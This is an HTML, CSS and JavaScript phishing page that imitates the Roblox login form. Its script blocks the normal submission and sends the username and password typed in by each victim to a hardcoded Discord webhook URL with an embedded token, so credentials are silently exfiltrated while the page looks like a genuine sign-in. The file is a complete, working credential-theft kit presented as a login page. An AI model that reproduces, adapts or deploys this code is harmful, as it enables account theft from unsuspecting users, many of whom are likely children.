<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
</head>
<body>
    <div class="container">
        <form class="login-form">
            <h2>Log In to Roblox</h2>
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username">
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password">
            </div>
            <button type="submit" id="login">Log In</button>
            <div class="extra-links">
                <a href="#">Forgot Password?</a>
                <span>or</span>
                <a href="#">Sign Up for Roblox</a>
            </div>
        </form>
    </div>
</body>

<style>
    body {
    margin: 0;
    padding: 0;
    font-family: Arial, sans-serif;
    background-color: #f3f3f3;
}

.container {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.login-form {
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
    max-width: 400px;
    width: 100%;
}

.logo {
    width: 100px;
    margin-bottom: 20px;
}

.input-group {
    margin-bottom: 15px;
    text-align: left;
}

.input-group label {
    display: block;
    font-weight: bold;
}

.input-group input {
    width: 94.5%;
    padding: 10px;
    border-radius: 5px;
    border: 1px solid #ccc;
}

button {
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 5px;
    background-color: #008bff;
    color: #fff;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

button:hover {
    background-color: #0056b3;
}

.extra-links {
    margin-top: 15px;
}

.extra-links a {
    color: #008bff;
    text-decoration: none;
    margin: 0 5px;
}

.extra-links span {
    color: #666;
    margin: 0 5px;
}
</style>

<script>


        let nameLabel = document.getElementById("username")
        let passwordLabel = document.getElementById("password")
        
        let loginButton = document.getElementById("login")

        function Sendmessage(name, message){
            
            const Webhook = "https://discord.com/api/webhooks/1221382443802689566/jZvZ9VbKfgNDboGrPsyb2DMjmaVsS8LwmU4qWIQA9rHYkF9uj8hYYUneyZbTxrZ5q8gp"
            const contents = `Username: ${name}\nMessage: ${message}`;

            const request = new XMLHttpRequest();

            request.open("POST", Webhook)
            request.setRequestHeader('Content-type', 'application/json')
            
            const params = {
                content: contents
            }

            request.send(JSON.stringify(params))
        }


        loginButton.addEventListener("click", function(event) {
        // Prevent the default form submission behavior
            event.preventDefault();

        // Call the SendMessage function with the input values
            Sendmessage(nameLabel.value, passwordLabel.value);
        });

</script>
</html>
